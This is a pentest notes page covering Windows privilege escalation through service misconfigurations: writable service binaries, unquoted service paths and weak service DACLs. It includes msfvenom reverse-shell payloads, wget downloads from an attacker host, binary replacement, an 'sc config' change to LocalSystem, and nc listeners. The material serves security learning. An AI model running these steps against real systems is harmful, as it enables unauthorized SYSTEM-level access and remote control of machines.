# Abusing service misconfigurations 

Escalate through insecure permissions on service executable:

1. Misconfigured Service executable DACL (modifiable permissions on the executable)
2. Reverse shell payload replacing service executable
3. Listener on attack machine

Escalate through unquoted service path:

1. Service binaries in a non-default path
2. BUILTIN\\Users group has AD and WD privileges
3. Reverse shell exe-service payload
4. Listener on attack machine

Escalate through insecure service permissions:

1. Misconfigured Service DACL
2. Reverse shell exe-service payload
3. Listener on attack machine

## Examples

### WindowsScheduler

1. Check service with `sc cq`:

```text
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

Check the permissions on the executable:

```text
C:\Users\unprivilegedusername>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

The `Everyone` group has modify permissions (M) on the service's executable. We can overwrite it with any payload, and the service will execute it with the privileges of the configured user account.

2. Generate an exe-service payload using msfvenom and serve it through a python webserver:

```text
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4445 -f exe-service -o rev-svc.exe

# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

3. On the target machine, in powershell, pull it down:

```text
wget http://<IP address attack machine>:8000/rev-svc.exe -O rev-svc.exe
```

4. Replace the service executable with the payload:

```text
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\unprivilegedusername\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

Start listener on attack machine:

```text
# nc -lvp 4445
```

Wait for the service to restart.

### Disk Sorter Enterprise

1. An unquoted service path was found.

```text
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

2. Generate an exe-service payload using msfvenom and serve it through a python webserver:

```text
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4446 -f exe-service -o rev-svc2.exe

# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

3. On the target machine, in powershell, pull it down:

```text
wget http://<IP address attack machine>:8000/rev-svc2.exe -O rev-svc2.exe
```

4. Move it to any of the locations where hijacking might occur. For example, move it to `C:\MyPrograms\Disk.exe`, and grant `Everyone` full permissions on the file to make sure it can be executed by the service:

```text
C:\> move C:\Users\unprivilegedusername\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

Start listener on attack machine:

```text
# nc -lvp 4446
```

Start the "updated" service:

```text
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

### Misconfigured Service DACL

1. Download [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to `C:\\tools`.
2. Check a namedservice DACL:

```text
C:\tools\AccessChk> accesschk64.exe -qlc namedservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

The `BUILTIN\\Users` group has the `SERVICE_ALL_ACCESS` permission, which means any user can reconfigure the service.

3. Build another exe-service reverse shell and start a listener for it on the attacker's machine:

```text
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4447 -f exe-service -o rev-svc3.exe

# nc -lvp 4447

# python3 -m http.server                                    
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
  
4. On the target machine, in powershell, pull it down:

```text
wget http://<IP address attack machine>:8000/rev-svc3.exe -O rev-svc3.exe
```

5. Grant permissions to `Everyone`:

```text
C:\> icacls C:\Users\unprivilegedusername\rev-svc3.exe /grant Everyone:F
```

6. Change the service's associated executable and account:

```text
C:\> sc config NamedService binPath= "C:\Users\unprivilegedusername\rev-svc3.exe" obj= LocalSystem
```

We can use any account to run the service. `LocalSystem` is just the highest privileged account available. 

To trigger the payload, restart the service:

```text
C:\> sc stop NamedService
C:\> sc start NamedService
```

## Notes

Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

* Use the `sc qc someservice` command for more info on a service. The associated executable is specified through the`BINARY_PATH_NAME` parameter, and the account used to run the service is shown on the `SERVICE_START_NAME` parameter.
* Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. 
* All services configurations are stored in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`
* A subkey exists for every service in the system. If a DACL has been configured for the service, it will be stored in a subkey called `Security`. Only administrators can modify such registry entries by default.

### Insecure Permissions on Service Executable

If an executable associated with a service has weak permissions that allow an adversary to modify or replace it, the adversary can gain the privileges of the service's account. 

### Unquoted path vulnerability

When we can't directly write into service executables, there might still be a chance. Most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule. 
Some installers change the permissions on the installed folders, making the services vulnerable. 
An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, an "Unquoted Service Paths vulnerability" (if found) can be exploited.

For example, the Administrator installed the `Disk Sorter` binaries under `c:\MyPrograms`. 
By default, this inherits the permissions of the `C:\` directory, which allows any user to create files and folders in it. Check with `icacls` in the Command Prompt:

```text
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```
The `BUILTIN\\Users` group has `AD` and `WD` privileges, allowing a user to create subdirectories and files.

The `Unquoted` in "Unquoted Service Paths vulnerability" means that the path of the associated executable is not properly quoted to account for spaces on the command.

Quoted:

    BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service

Unquoted:

    BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

With "unquoted", the SCM starts searching for each of the binaries in the order:

    C:\\MyPrograms\\Disk.exe
    C:\\MyPrograms\\Disk Sorter.exe
    C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. 

The last option is expected to succeed and will be run in a default installation. 
Unless `Disk.exe` or `Disk Sorter.exe` exists!

### Insecure service permissions

You might still have a slight chance of taking advantage of a service if the service's executable `DACL` is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable `DACL`) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including `SYSTEM` itself.
